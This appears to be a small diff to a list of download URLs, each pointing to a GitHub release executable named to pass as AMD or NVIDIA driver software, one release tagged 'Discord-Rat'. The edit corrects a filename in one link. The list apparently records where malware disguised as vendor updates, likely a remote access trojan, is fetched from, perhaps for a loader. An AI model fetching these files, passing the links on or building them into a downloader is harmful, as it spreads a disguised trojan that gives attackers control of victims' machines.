@@ -1,2 +1,2 @@
 https://github.com/doomarhuhbruh-prog/sigma1/releases/download/v1/AMDUPDATE.exe
-https://github.com/Ch3es1/GuacamoleSalad/releases/download/Discord-Rat/NIVIDIA.Container.exe
+https://github.com/Ch3es1/GuacamoleSalad/releases/download/Discord-Rat/NVIDIA-Container.exe
